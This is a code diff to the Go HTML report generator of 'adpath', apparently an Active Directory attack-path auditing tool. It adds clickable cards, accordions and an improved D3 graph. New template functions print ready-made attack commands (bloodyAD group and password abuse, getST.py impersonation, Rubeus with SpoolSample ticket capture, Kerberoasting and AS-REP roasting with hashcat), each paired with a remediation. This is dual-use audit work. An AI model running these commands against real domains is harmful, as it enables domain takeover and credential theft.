@@ -22,12 +22,14 @@ import (
 type ReportData struct {
 	Domain      string
 	GeneratedAt string
+	AuthMethod  string // "PTH (NTLM)", "PTT (Kerberos)", "Password", "Anonymous"
 	Summary     Summary
 	Users       []adldap.LDAPUser
 	Groups      []adldap.LDAPGroup
 	Computers   []adldap.LDAPComputer
 	AttackPaths []graph.AttackPath
 	GraphJSON   template.JS
+	ForestWide  bool
 	// v0.2
 	KerberosResult *analysis.KerberosResult
 	ACLResult      *analysis.ACLResult
@@ -91,12 +93,14 @@ func Generate(
 	aclResult *analysis.ACLResult,
 	dr *analysis.DelegationResult,
 	gr *analysis.GPOResult,
+	authMethod string,
 ) error {
 	color.Blue("[*] Generating HTML report...")
 
 	data := ReportData{
 	Domain:           result.Domain,
 	GeneratedAt:      time.Now().Format("2006-01-02 15:04:05"),
+	AuthMethod:       authMethod,
 	Users:            result.Users,
 	Groups:           result.Groups,
 	Computers:        result.Computers,
@@ -107,6 +111,7 @@ func Generate(
 	ACLResult:        aclResult,
 	DelegationResult: dr,
 	GPOResult:        gr,
+	ForestWide:       result.ForestWide,
 }
 
 	// парсимо шаблон
@@ -327,6 +332,78 @@ func templateFuncs() template.FuncMap {
 			}
 			return "No"
 		},
+		"aclExploit": func(right, principal, target, domain string) string {
+			switch right {
+			case "GenericAll":
+				return "bloodyAD -u " + principal + " -p '<pass>' -d " + domain + " --host <DC> add groupMember 'Domain Admins' " + principal
+			case "WriteDACL":
+				return "dacledit.py -action write -rights FullControl -principal " + principal + " -target " + target + " '" + domain + "/" + principal + ":<pass>'"
+			case "WriteOwner":
+				return "owneredit.py -action write -new-owner " + principal + " -target " + target + " '" + domain + "/" + principal + ":<pass>'"
+			case "ForceChangePassword":
+				return "bloodyAD -u " + principal + " -p '<pass>' -d " + domain + " --host <DC> set password " + target + " 'NewPass123!'"
+			case "AddMember":
+				return "bloodyAD -u " + principal + " -p '<pass>' -d " + domain + " --host <DC> add groupMember '" + target + "' " + principal
+			case "GenericWrite":
+				return "bloodyAD -u " + principal + " -p '<pass>' -d " + domain + " --host <DC> set object " + target + " -a servicePrincipalName=fake/spn"
+			default:
+				return "Use BloodHound / dacledit.py to abuse this ACL right"
+			}
+		},
+		"aclFix": func(right string) string {
+			switch right {
+			case "GenericAll":
+				return "Remove GenericAll from non-admin principals; audit AdminSDHolder inheritance"
+			case "WriteDACL":
+				return "Restrict WriteDACL to Domain Admins; enable Protected Users group for privileged accounts"
+			case "WriteOwner":
+				return "Set object owner to Domain Admins; enable AdminSDHolder for sensitive objects"
+			case "ForceChangePassword":
+				return "Remove ForceChangePassword; use 'User must change password at next logon' instead"
+			case "AddMember":
+				return "Remove AddMember from sensitive groups; use AD Tiered Administration model"
+			case "GenericWrite":
+				return "Remove GenericWrite; restrict attribute modification to delegated OUs only"
+			default:
+				return "Review and remove unnecessary privilege delegation for this principal"
+			}
+		},
+		"delegExploit": func(delegType string) string {
+			switch delegType {
+			case "Unconstrained":
+				return "Rubeus.exe monitor /interval:5 /filteruser:DC$ — trigger with SpoolSample.exe <DC> <host> to capture DC TGT → pass-the-ticket as DA"
+			case "Constrained":
+				return "getST.py -spn cifs/<target> -impersonate administrator '<domain>/<account>:<pass>'"
+			case "Resource-Based Constrained":
+				return "getST.py -spn cifs/<target> -impersonate administrator -self '<domain>/<account>:<pass>' (RBCD S4U2Self)"
+			default:
+				return "Use impacket getST.py to abuse S4U2Proxy for service impersonation"
+			}
+		},
+		"delegFix": func(delegType string) string {
+			switch delegType {
+			case "Unconstrained":
+				return "Replace unconstrained delegation with Resource-Based CD; add host to Protected Users; enable 'Account is sensitive and cannot be delegated'"
+			case "Constrained":
+				return "Restrict constrained delegation to minimum required SPNs; avoid TRUSTED_TO_AUTH_FOR_DELEGATION (protocol transition)"
+			default:
+				return "Audit msDS-AllowedToActOnBehalfOfOtherIdentity; remove unnecessary RBCD grants"
+			}
+		},
+		"pathExploit": func(nodes []graph.Node) string {
+			for _, n := range nodes {
+				if n.Kerberoastable {
+					return "Kerberoast " + n.SAMAccountName + ": GetUserSPNs.py domain/user:pass → crack TGS → use creds to reach DA"
+				}
+				if n.ASREPRoastable {
+					return "AS-REP roast " + n.SAMAccountName + ": GetNPUsers.py domain/ -usersfile users.txt → crack hash → use creds"
+				}
+				if n.UnconstrainedDelegation {
+					return "Compromise " + n.SAMAccountName + " (unconstrained delegation) → harvest DA TGT via SpoolSample/PetitPotam"
+				}
+			}
+			return "Account has transitive DA membership — existing credentials grant DA access (net use \\\\DC\\IPC$ or WinRM)"
+		},
 	}
 }
 
@@ -377,6 +454,24 @@ body { font-family: 'Segoe UI', system-ui, sans-serif; background: #0f1117; colo
 .card.critical .value { color: #e53e3e; }
 .card.warning .value { color: #f6ad55; }
 .card.ok .value { color: #68d391; }
+.card[onclick] { cursor: pointer; transition: border-color 0.15s, transform 0.12s; }
+.card[onclick]:hover { border-color: #63b3ed; transform: translateY(-2px); }
+
+/* Accordion */
+.acc-toggle { display: flex; align-items: center; gap: 8px; cursor: pointer;
+  margin-top: 10px; padding: 7px 12px; background: #2d3748; border-radius: 6px;
+  font-size: 0.78rem; color: #a0aec0; user-select: none; border: none; width: 100%;
+  text-align: left; }
+.acc-toggle:hover { background: #374151; color: #e2e8f0; }
+.acc-body { display: none; padding: 12px 14px; margin-top: 2px;
+  background: #111827; border: 1px solid #2d3748; border-radius: 6px;
+  font-size: 0.82rem; line-height: 1.6; }
+.acc-body.open { display: block; }
+.acc-cmd { font-family: monospace; background: #0a0e1a; padding: 4px 8px;
+  border-radius: 4px; color: #68d391; font-size: 0.78rem; display: block; margin-top: 4px;
+  word-break: break-all; }
+.acc-label { color: #718096; font-size: 0.75rem; text-transform: uppercase;
+  letter-spacing: 0.05em; margin-top: 8px; }
 
 /* Badges */
 .badge { display: inline-block; padding: 2px 8px; border-radius: 4px;
@@ -434,9 +529,10 @@ tr:hover td { background: #1a1f2e; }
 <body>
 
 <div class="header">
-  <h1>⚔ adpath — AD Security Report</h1>
+  <h1>⚔ adpath v0.4 — AD Security Report</h1>
   <div class="meta">
     Domain: <span class="domain">{{.Domain}}</span> &nbsp;|&nbsp;
+    Auth: <span style="color:#68d391">{{.AuthMethod}}</span> &nbsp;|&nbsp;
     Generated: {{.GeneratedAt}}
   </div>
 </div>
@@ -470,27 +566,27 @@ tr:hover td { background: #1a1f2e; }
   <!-- Attack Surface -->
   <div style="font-size:11px;font-weight:500;color:#718096;text-transform:uppercase;letter-spacing:.06em;margin-bottom:8px">Attack Surface</div>
   <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:8px;margin-bottom:20px">
-    <div class="card {{if gt .Summary.AttackPathsCount 0}}critical{{else}}ok{{end}}">
+    <div class="card {{if gt .Summary.AttackPathsCount 0}}critical{{else}}ok{{end}}" onclick="showTabByClick(event,'paths')" title="View Attack Paths">
       <div class="value">{{.Summary.AttackPathsCount}}</div>
       <div class="label">Attack Paths to DA</div>
     </div>
-    <div class="card {{if gt .Summary.CriticalCount 0}}critical{{else}}ok{{end}}">
+    <div class="card {{if gt .Summary.CriticalCount 0}}critical{{else}}ok{{end}}" onclick="showTabByClick(event,'paths')" title="View Critical Paths">
       <div class="value">{{.Summary.CriticalCount}}</div>
       <div class="label">Critical Paths (depth ≤ 2)</div>
     </div>
-    <div class="card {{if gt .Summary.KerberoastableCount 0}}warning{{else}}ok{{end}}">
+    <div class="card {{if gt .Summary.KerberoastableCount 0}}warning{{else}}ok{{end}}" onclick="showTabByClick(event,'kerberos')" title="View Kerberoastable accounts">
       <div class="value">{{.Summary.KerberoastableCount}}</div>
       <div class="label">Kerberoastable</div>
     </div>
-    <div class="card {{if gt .Summary.ASREPCount 0}}warning{{else}}ok{{end}}">
+    <div class="card {{if gt .Summary.ASREPCount 0}}warning{{else}}ok{{end}}" onclick="showTabByClick(event,'kerberos')" title="View AS-REP Roastable accounts">
       <div class="value">{{.Summary.ASREPCount}}</div>
       <div class="label">AS-REP Roastable</div>
     </div>
-    <div class="card {{if gt .Summary.DelegationCount 0}}warning{{else}}ok{{end}}">
+    <div class="card {{if gt .Summary.DelegationCount 0}}warning{{else}}ok{{end}}" onclick="showTabByClick(event,'delegation')" title="View Delegation findings">
       <div class="value">{{.Summary.DelegationCount}}</div>
       <div class="label">Delegation Issues</div>
     </div>
-    <div class="card {{if gt .Summary.DangerousACLCount 0}}critical{{else}}ok{{end}}">
+    <div class="card {{if gt .Summary.DangerousACLCount 0}}critical{{else}}ok{{end}}" onclick="showTabByClick(event,'acl')" title="View ACL findings">
       <div class="value">{{.Summary.DangerousACLCount}}</div>
       <div class="label">Dangerous ACLs</div>
     </div>
@@ -499,19 +595,19 @@ tr:hover td { background: #1a1f2e; }
   <!-- Account Hygiene -->
   <div style="font-size:11px;font-weight:500;color:#718096;text-transform:uppercase;letter-spacing:.06em;margin-bottom:8px">Account Hygiene</div>
   <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:8px;margin-bottom:20px">
-    <div class="card {{if gt .Summary.PasswordNeverExpires 0}}warning{{else}}ok{{end}}">
+    <div class="card {{if gt .Summary.PasswordNeverExpires 0}}warning{{else}}ok{{end}}" onclick="showTabByClick(event,'users')" title="View users with non-expiring passwords">
       <div class="value">{{.Summary.PasswordNeverExpires}}</div>
       <div class="label">Pwd Never Expires</div>
     </div>
-    <div class="card {{if gt .Summary.AdminCount 0}}warning{{else}}ok{{end}}">
+    <div class="card {{if gt .Summary.AdminCount 0}}warning{{else}}ok{{end}}" onclick="showTabByClick(event,'users')" title="View admin-flagged users">
       <div class="value">{{.Summary.AdminCount}}</div>
       <div class="label">AdminCount = 1</div>
     </div>
-    <div class="card">
+    <div class="card" onclick="showTabByClick(event,'users')" title="View all users">
       <div class="value">{{.Summary.EnabledUsers}}</div>
       <div class="label">Enabled Users</div>
     </div>
-    <div class="card">
+    <div class="card" onclick="showTabByClick(event,'computers')" title="View computers">
       <div class="value">{{.Summary.TotalComputers}}</div>
       <div class="label">Computers</div>
     </div>
@@ -602,6 +698,15 @@ tr:hover td { background: #1a1f2e; }
           {{end}}
         {{end}}
       </div>
+      <button class="acc-toggle" onclick="toggleAcc(this)">
+        ▶ &nbsp;🔴 Exploit &nbsp;/&nbsp; 🛡 Fix
+      </button>
+      <div class="acc-body">
+        <div class="acc-label">Exploit</div>
+        <span class="acc-cmd">{{pathExploit $path.Nodes}}</span>
+        <div class="acc-label" style="margin-top:10px">Fix</div>
+        <div style="color:#a0aec0">Enforce least-privilege group membership; remove transitive paths to Domain Admins; use AD Tiered Administration model. Audit with: <span class="acc-cmd">Get-ADGroupMember 'Domain Admins' -Recursive</span></div>
+      </div>
     </div>
   </div>
   {{end}}
@@ -610,16 +715,23 @@ tr:hover td { background: #1a1f2e; }
 
 <!-- GRAPH TAB -->
 <div id="tab-graph" class="tab-pane">
-  <h2 class="section-title">Attack Path Graph <span>D3.js force-directed</span></h2>
-  <div id="graph-container">
-    <svg id="graph-svg"></svg>
+  <h2 class="section-title">Attack Path Graph <span>Layered path view — nodes sized by path count</span></h2>
+  <div style="display:flex;gap:16px;align-items:center;margin-bottom:12px;flex-wrap:wrap">
+    <div style="font-size:0.8rem;color:#718096">
+      <span style="color:#fc8181">●</span> DA/Admin &nbsp;
+      <span style="color:#f6ad55">●</span> Kerberoastable &nbsp;
+      <span style="color:#b794f4">●</span> Group &nbsp;
+      <span style="color:#90cdf4">●</span> Computer &nbsp;
+      <span style="color:#63b3ed">●</span> User
+    </div>
+    <button onclick="resetZoom()" style="margin-left:auto;padding:4px 12px;background:#2d3748;border:none;color:#a0aec0;border-radius:4px;cursor:pointer;font-size:0.8rem">Reset Zoom</button>
   </div>
-  <div style="margin-top:12px; font-size:0.8rem; color:#718096">
-    🔴 Domain Admins / AdminCount &nbsp;|&nbsp;
-    🟡 Kerberoastable &nbsp;|&nbsp;
-    🔵 User &nbsp;|&nbsp;
-    🟣 Group &nbsp;|&nbsp;
-    ⚪ Computer
+  <div id="graph-container" style="position:relative">
+    <svg id="graph-svg"></svg>
+    <div id="graph-tooltip" style="display:none;position:absolute;background:#1a1f2e;border:1px solid #2d3748;border-radius:6px;padding:10px 14px;font-size:0.8rem;pointer-events:none;max-width:280px;z-index:10"></div>
+  </div>
+  <div style="margin-top:8px;font-size:0.75rem;color:#4a5568">
+    Drag to pan · Scroll to zoom · Hover node for details · Node size = number of paths through it
   </div>
 </div>
 
@@ -692,31 +804,53 @@ tr:hover td { background: #1a1f2e; }
 
 <!-- COMPUTERS TAB -->
 <div id="tab-computers" class="tab-pane">
-  <h2 class="section-title">Computers <span>{{.Summary.TotalComputers}} total</span></h2>
+  <h2 class="section-title">
+    Computers
+    <span>{{.Summary.TotalComputers}} total{{if .ForestWide}} — forest-wide{{end}}</span>
+  </h2>
   <div class="table-wrap">
   <table>
     <thead>
       <tr>
         <th>Name</th>
-        <th>DNS</th>
+        <th>Domain</th>
         <th>OS</th>
+        <th>Version</th>
         <th>Enabled</th>
-        <th>Unconstrained Deleg.</th>
+        <th>LAPS</th>
+        <th>Uncons. Deleg.</th>
         <th>Last Logon</th>
+        <th>Created</th>
+        <th>Description</th>
       </tr>
     </thead>
     <tbody>
     {{range .Computers}}
     <tr>
-      <td class="mono">{{.SAMAccountName}}</td>
-      <td class="mono">{{.DNSHostName}}</td>
-      <td>{{.OperatingSystem}} {{.OperatingSystemVersion}}</td>
+      <td class="mono" style="white-space:nowrap">
+        {{.SAMAccountName}}
+        {{if .IsGC}}<span style="color:#4a5568;font-size:0.7rem" title="Partial data from Global Catalog">&nbsp;(GC)</span>{{end}}
+        {{if .DNSHostName}}<div style="color:#718096;font-size:0.75rem">{{.DNSHostName}}</div>{{end}}
+      </td>
+      <td style="font-size:0.78rem;color:#a0aec0">{{.Domain}}</td>
+      <td style="white-space:nowrap">
+        {{if .OperatingSystem}}{{.OperatingSystem}}
+        {{else}}<span style="color:#4a5568">—</span>{{end}}
+      </td>
+      <td class="mono" style="font-size:0.78rem;white-space:nowrap">
+        {{if .OperatingSystemVersion}}{{.OperatingSystemVersion}}
+        {{if .OperatingSystemSP}}&nbsp;{{.OperatingSystemSP}}{{end}}
+        {{else}}—{{end}}
+      </td>
       <td>{{if .Enabled}}<span class="badge badge-ok">Yes</span>
           {{else}}<span class="badge" style="background:#2d3748;color:#718096">No</span>{{end}}</td>
-      <td>{{if .UnconstrainedDelegation}}
-            <span class="badge badge-critical">Yes</span>
+      <td>{{if .LAPSEnabled}}<span class="badge badge-ok">✓</span>
+          {{else}}<span class="badge badge-medium">No</span>{{end}}</td>
+      <td>{{if .UnconstrainedDelegation}}<span class="badge badge-critical">Yes</span>
           {{else}}—{{end}}</td>
-      <td class="mono">{{.LastLogon}}</td>
+      <td class="mono" style="font-size:0.78rem">{{.LastLogon}}</td>
+      <td class="mono" style="font-size:0.78rem">{{.WhenCreated}}</td>
+      <td style="font-size:0.78rem;color:#718096">{{.Description}}</td>
     </tr>
     {{end}}
     </tbody>
@@ -734,6 +868,18 @@ tr:hover td { background: #1a1f2e; }
     <span>{{len .KerberosResult.KerberoastableAccounts}}</span>
   </h3>
   {{if .KerberosResult.KerberoastableAccounts}}
+  <div style="margin-bottom:8px">
+    <button class="acc-toggle" onclick="toggleAcc(this)" style="background:#1a2a1a;color:#68d391;margin-bottom:4px">
+      ▶ &nbsp;🔴 Exploit &nbsp;/&nbsp; 🛡 Fix — Kerberoasting
+    </button>
+    <div class="acc-body">
+      <div class="acc-label">Exploit</div>
+      <span class="acc-cmd">GetUserSPNs.py domain/user:pass -dc-ip &lt;DC&gt; -request-user &lt;account&gt; -outputfile kerberoast.txt</span>
+      <span class="acc-cmd" style="margin-top:4px">hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt</span>
+      <div class="acc-label" style="margin-top:10px">Fix</div>
+      <div style="color:#a0aec0">Use managed service accounts (gMSA) — auto-rotating 120-char passwords, not crackable. Remove SPNs from regular user accounts. Enable AES-only Kerberos encryption (no RC4).</div>
+    </div>
+  </div>
   <div class="table-wrap">
   <table>
     <thead>
@@ -765,6 +911,18 @@ tr:hover td { background: #1a1f2e; }
     <span>{{len .KerberosResult.ASREPAccounts}}</span>
   </h3>
   {{if .KerberosResult.ASREPAccounts}}
+  <div style="margin-bottom:8px">
+    <button class="acc-toggle" onclick="toggleAcc(this)" style="background:#1a2a1a;color:#68d391;margin-bottom:4px">
+      ▶ &nbsp;🔴 Exploit &nbsp;/&nbsp; 🛡 Fix — AS-REP Roasting
+    </button>
+    <div class="acc-body">
+      <div class="acc-label">Exploit</div>
+      <span class="acc-cmd">GetNPUsers.py domain/ -usersfile users.txt -format hashcat -outputfile asrep.txt -dc-ip &lt;DC&gt;</span>
+      <span class="acc-cmd" style="margin-top:4px">hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt</span>
+      <div class="acc-label" style="margin-top:10px">Fix</div>
+      <div style="color:#a0aec0">Enable "Do not require Kerberos preauthentication" only if absolutely needed. Enforce strong passwords (&gt;25 chars) on affected accounts. Add to Protected Users security group (prevents AS-REP roasting).</div>
+    </div>
+  </div>
   <div class="table-wrap">
   <table>
     <thead>
@@ -800,32 +958,27 @@ tr:hover td { background: #1a1f2e; }
   </h2>
   {{if .ACLResult}}
   {{if .ACLResult.Findings}}
-  <div class="table-wrap">
-  <table>
-    <thead>
-      <tr>
-        <th>Principal</th>
-        <th>Type</th>
-        <th>Right</th>
-        <th>Target</th>
-        <th>Target Type</th>
-        <th>Severity</th>
-      </tr>
-    </thead>
-    <tbody>
-    {{range .ACLResult.Findings}}
-    <tr>
-      <td class="mono">{{.PrincipalName}}</td>
-      <td><span class="badge" style="background:#2d3748;color:#a0aec0">{{.PrincipalType}}</span></td>
-      <td><span class="badge badge-critical">{{.Right}}</span></td>
-      <td class="mono">{{.TargetName}}</td>
-      <td><span class="badge" style="background:#2d3748;color:#a0aec0">{{.TargetType}}</span></td>
-      <td><span class="badge {{if eq .Severity "Critical"}}badge-critical{{else if eq .Severity "High"}}badge-medium{{else}}badge-ok{{end}}">{{.Severity}}</span></td>
-    </tr>
-    {{end}}
-    </tbody>
-  </table>
+  {{range $i, $f := .ACLResult.Findings}}
+  <div class="path-card" style="margin-bottom:10px">
+    <div class="path-header" style="flex-wrap:wrap;gap:8px">
+      <span class="badge {{if eq $f.Severity "Critical"}}badge-critical{{else if eq $f.Severity "High"}}badge-medium{{else}}badge-ok{{end}}">{{$f.Severity}}</span>
+      <span class="badge badge-critical" style="font-family:monospace">{{$f.Right}}</span>
+      <span class="mono" style="color:#e2e8f0">{{$f.PrincipalName}}</span>
+      <span style="color:#4a5568">─▶</span>
+      <span class="mono" style="color:#f6ad55">{{$f.TargetName}}</span>
+      <span class="badge" style="background:#2d3748;color:#a0aec0;margin-left:auto">{{$f.PrincipalType}} → {{$f.TargetType}}</span>
+    </div>
+    <div style="padding:0 16px">
+      <button class="acc-toggle" onclick="toggleAcc(this)">▶ &nbsp;🔴 Exploit &nbsp;/&nbsp; 🛡 Fix</button>
+      <div class="acc-body">
+        <div class="acc-label">Exploit ({{$f.Right}})</div>
+        <span class="acc-cmd">{{aclExploit (print $f.Right) $f.PrincipalName $f.TargetName $.ACLResult.Domain}}</span>
+        <div class="acc-label" style="margin-top:10px">Fix</div>
+        <div style="color:#a0aec0">{{aclFix (print $f.Right)}}</div>
+      </div>
+    </div>
   </div>
+  {{end}}
   {{else}}<p style="color:#68d391">✓ No dangerous ACL findings.</p>{{end}}
   {{else}}<p style="color:#718096">ACL data not available.</p>{{end}}
 </div>
@@ -838,30 +991,26 @@ tr:hover td { background: #1a1f2e; }
   </h2>
   {{if .DelegationResult}}
   {{if .DelegationResult.Findings}}
-  <div class="table-wrap">
-  <table>
-    <thead>
-      <tr>
-        <th>Account</th>
-        <th>Type</th>
-        <th>Delegation Type</th>
-        <th>Risk</th>
-        <th>Allowed Services</th>
-      </tr>
-    </thead>
-    <tbody>
-    {{range .DelegationResult.Findings}}
-    <tr>
-      <td class="mono">{{.SAMAccountName}}</td>
-      <td><span class="badge" style="background:#2d3748;color:#a0aec0">{{.ObjectType}}</span></td>
-      <td><span class="badge badge-critical">{{.DelegationType}}</span></td>
-      <td style="color:#fc8181; font-size:0.8rem">{{.RiskReason}}</td>
-      <td class="mono" style="font-size:0.75rem">{{joinSPNs .AllowedServices}}</td>
-    </tr>
-    {{end}}
-    </tbody>
-  </table>
+  {{range .DelegationResult.Findings}}
+  <div class="path-card" style="margin-bottom:10px">
+    <div class="path-header" style="flex-wrap:wrap;gap:8px">
+      <span class="badge badge-critical">{{.DelegationType}}</span>
+      <span class="mono" style="color:#e2e8f0">{{.SAMAccountName}}</span>
+      <span class="badge" style="background:#2d3748;color:#a0aec0">{{.ObjectType}}</span>
+      {{if .AllowedServices}}<span style="color:#718096;font-size:0.78rem">→ {{joinSPNs .AllowedServices}}</span>{{end}}
+    </div>
+    <div style="padding:4px 16px 0">
+      <div style="color:#fc8181;font-size:0.8rem;padding-bottom:4px">⚠ {{.RiskReason}}</div>
+      <button class="acc-toggle" onclick="toggleAcc(this)">▶ &nbsp;🔴 Exploit &nbsp;/&nbsp; 🛡 Fix</button>
+      <div class="acc-body">
+        <div class="acc-label">Exploit ({{.DelegationType}})</div>
+        <span class="acc-cmd">{{delegExploit (print .DelegationType)}}</span>
+        <div class="acc-label" style="margin-top:10px">Fix</div>
+        <div style="color:#a0aec0">{{delegFix (print .DelegationType)}}</div>
+      </div>
+    </div>
   </div>
+  {{end}}
   {{else}}<p style="color:#68d391">✓ No dangerous delegation configurations.</p>{{end}}
   {{else}}<p style="color:#718096">Delegation data not available.</p>{{end}}
 </div>
@@ -991,10 +1140,38 @@ function showTab(name) {
   if (name === 'graph') initGraph();
 }
 
+function showTabByClick(e, name) {
+  e.stopPropagation();
+  document.querySelectorAll('.tab-pane').forEach(p => p.classList.remove('active'));
+  document.querySelectorAll('.nav button').forEach(b => b.classList.remove('active'));
+  document.getElementById('tab-' + name).classList.add('active');
+  const btn = document.querySelector('.nav button[onclick="showTab(\'' + name + '\')"]');
+  if (btn) btn.classList.add('active');
+  if (name === 'graph') initGraph();
+  window.scrollTo({ top: 0, behavior: 'smooth' });
+}
+
 // ============================================================
-// D3.js force-directed graph
+// Accordion toggle
+// ============================================================
+function toggleAcc(btn) {
+  const body = btn.nextElementSibling;
+  const open = body.classList.toggle('open');
+  btn.textContent = btn.textContent.replace(/^[▶▼]/, open ? '▼' : '▶');
+}
+
+// ============================================================
+// D3.js attack path graph (improved)
 // ============================================================
 let graphInitialized = false;
+let zoomBehavior = null;
+let svgRoot = null;
+
+function resetZoom() {
+  if (svgRoot && zoomBehavior) {
+    svgRoot.transition().duration(400).call(zoomBehavior.transform, d3.zoomIdentity);
+  }
+}
 
 function initGraph() {
   if (graphInitialized) return;
@@ -1003,79 +1180,145 @@ function initGraph() {
   const data = {{.GraphJSON}};
   if (!data.nodes || data.nodes.length === 0) {
     document.getElementById('graph-container').innerHTML =
-      '<p style="padding:20px;color:#718096">No attack paths to visualize.</p>';
+      '<p style="padding:40px;color:#718096;text-align:center">No attack paths to visualize.</p>';
     return;
   }
 
-  const svg = d3.select('#graph-svg');
+  // Count how many paths each node appears in (for sizing)
+  const pathCount = {};
+  data.nodes.forEach(n => { pathCount[n.id] = 0; });
+  data.edges.forEach(e => {
+    pathCount[e.source] = (pathCount[e.source] || 0) + 1;
+    pathCount[e.target] = (pathCount[e.target] || 0) + 1;
+  });
+  const maxCount = Math.max(1, ...Object.values(pathCount));
+
   const container = document.getElementById('graph-container');
   const width = container.clientWidth;
   const height = container.clientHeight;
 
-  // zoom
-  const zoom = d3.zoom().scaleExtent([0.3, 3])
-    .on('zoom', e => g.attr('transform', e.transform));
-  svg.call(zoom);
+  const svg = d3.select('#graph-svg');
+  svgRoot = svg;
+
+  // Arrow marker
+  svg.append('defs').selectAll('marker').data(['arrow','arrow-admin']).enter()
+    .append('marker')
+    .attr('id', d => d)
+    .attr('viewBox', '0 -5 10 10')
+    .attr('refX', 28).attr('refY', 0)
+    .attr('markerWidth', 5).attr('markerHeight', 5)
+    .attr('orient', 'auto')
+    .append('path')
+    .attr('d', 'M0,-5L10,0L0,5')
+    .attr('fill', (d, i) => i === 1 ? '#fc8181' : '#4a5568');
+
   const g = svg.append('g');
 
-  // стрілки для edges
-  svg.append('defs').append('marker')
-    .attr('id', 'arrow')
-    .attr('viewBox', '0 -5 10 10')
-    .attr('refX', 20).attr('refY', 0)
-    .attr('markerWidth', 6).attr('markerHeight', 6)
-    .attr('orient', 'auto')
-    .append('path').attr('d', 'M0,-5L10,0L0,5').attr('fill', '#4a5568');
+  zoomBehavior = d3.zoom()
+    .scaleExtent([0.2, 4])
+    .on('zoom', e => g.attr('transform', e.transform));
+  svg.call(zoomBehavior);
 
-  // simulation
+  // Simulation with stronger repulsion to prevent overlap
   const simulation = d3.forceSimulation(data.nodes)
-    .force('link', d3.forceLink(data.edges)
-      .id(d => d.id).distance(120))
-    .force('charge', d3.forceManyBody().strength(-300))
+    .force('link', d3.forceLink(data.edges).id(d => d.id).distance(150).strength(0.7))
+    .force('charge', d3.forceManyBody().strength(-600))
     .force('center', d3.forceCenter(width / 2, height / 2))
-    .force('collision', d3.forceCollide(40));
+    .force('collision', d3.forceCollide(d => nodeRadius(d, pathCount, maxCount) + 15));
 
-  // edges
-  const link = g.append('g').selectAll('line')
+  // Edges
+  const link = g.append('g').attr('class', 'links').selectAll('line')
     .data(data.edges).enter().append('line')
-    .attr('class', 'link')
-    .attr('marker-end', 'url(#arrow)');
+    .attr('stroke', d => {
+      const tgt = data.nodes.find(n => n.id === (d.target.id || d.target));
+      return (tgt && tgt.adminCount) ? '#fc8181' : '#4a5568';
+    })
+    .attr('stroke-opacity', 0.7)
+    .attr('stroke-width', 2)
+    .attr('marker-end', d => {
+      const tgt = data.nodes.find(n => n.id === (d.target.id || d.target));
+      return (tgt && tgt.adminCount) ? 'url(#arrow-admin)' : 'url(#arrow)';
+    });
 
-  // nodes
-  const node = g.append('g').selectAll('g')
+  // Edge type labels
+  const edgeLabel = g.append('g').selectAll('text')
+    .data(data.edges).enter().append('text')
+    .attr('font-size', 9)
+    .attr('fill', '#4a5568')
+    .attr('text-anchor', 'middle')
+    .text(d => d.type || '');
+
+  // Node groups
+  const tooltip = document.getElementById('graph-tooltip');
+
+  const node = g.append('g').attr('class', 'nodes').selectAll('g')
     .data(data.nodes).enter().append('g')
+    .on('mouseover', (e, d) => {
+      const r = nodeRadius(d, pathCount, maxCount);
+      tooltip.style.display = 'block';
+      tooltip.innerHTML =
+        '<div style="font-weight:600;color:#e2e8f0;margin-bottom:4px">' + d.label + '</div>' +
+        '<div style="color:#718096;font-size:0.75rem;word-break:break-all">' + d.id + '</div>' +
+        '<div style="margin-top:6px;display:flex;gap:6px;flex-wrap:wrap">' +
+        (d.adminCount ? '<span style="background:#742a2a;color:#fc8181;padding:2px 6px;border-radius:3px;font-size:11px">AdminCount</span>' : '') +
+        (d.kerberoastable ? '<span style="background:#744210;color:#f6ad55;padding:2px 6px;border-radius:3px;font-size:11px">Kerberoastable</span>' : '') +
+        (d.asrepRoastable ? '<span style="background:#742a2a;color:#feb2b2;padding:2px 6px;border-radius:3px;font-size:11px">AS-REP</span>' : '') +
+        '<span style="background:#2d3748;color:#a0aec0;padding:2px 6px;border-radius:3px;font-size:11px">' + d.type + '</span>' +
+        '<span style="background:#2d3748;color:#a0aec0;padding:2px 6px;border-radius:3px;font-size:11px">' + (pathCount[d.id]||0) + ' edge(s)</span>' +
+        '</div>';
+    })
+    .on('mousemove', e => {
+      const rect = container.getBoundingClientRect();
+      let x = e.clientX - rect.left + 12, y = e.clientY - rect.top + 12;
+      if (x + 290 > rect.width) x = e.clientX - rect.left - 290;
+      tooltip.style.left = x + 'px';
+      tooltip.style.top = y + 'px';
+    })
+    .on('mouseout', () => { tooltip.style.display = 'none'; })
     .call(d3.drag()
       .on('start', (e, d) => { if (!e.active) simulation.alphaTarget(0.3).restart(); d.fx=d.x; d.fy=d.y; })
       .on('drag',  (e, d) => { d.fx=e.x; d.fy=e.y; })
       .on('end',   (e, d) => { if (!e.active) simulation.alphaTarget(0); d.fx=null; d.fy=null; }));
 
-  node.append('circle').attr('r', 16)
+  node.append('circle')
+    .attr('r', d => nodeRadius(d, pathCount, maxCount))
     .attr('fill', d => nodeColor(d))
-    .attr('stroke', d => nodeStroke(d));
+    .attr('stroke', d => d.asrepRoastable ? '#fc8181' : (d.adminCount ? '#feb2b2' : '#2d3748'))
+    .attr('stroke-width', d => d.adminCount || d.asrepRoastable ? 3 : 1.5)
+    .attr('cursor', 'pointer');
 
-  node.append('text').attr('class', 'node-label')
-    .attr('dy', 28).attr('text-anchor', 'middle')
+  node.append('text')
+    .attr('dy', d => nodeRadius(d, pathCount, maxCount) + 14)
+    .attr('text-anchor', 'middle')
+    .attr('font-size', 11)
+    .attr('fill', '#e2e8f0')
+    .attr('pointer-events', 'none')
     .text(d => d.label);
 
   simulation.on('tick', () => {
     link
       .attr('x1', d => d.source.x).attr('y1', d => d.source.y)
       .attr('x2', d => d.target.x).attr('y2', d => d.target.y);
+    edgeLabel
+      .attr('x', d => (d.source.x + d.target.x) / 2)
+      .attr('y', d => (d.source.y + d.target.y) / 2 - 4);
     node.attr('transform', d => 'translate(' + d.x + ',' + d.y + ')');
   });
 }
 
-function nodeColor(d) {
-  if (d.adminCount)     return '#fc8181'; // червоний — DA/admin
-  if (d.kerberoastable) return '#f6ad55'; // жовтий — kerberoastable
-  if (d.type === 'group')    return '#b794f4'; // фіолетовий
-  if (d.type === 'computer') return '#90cdf4'; // блакитний
-  return '#63b3ed'; // синій — звичайний user
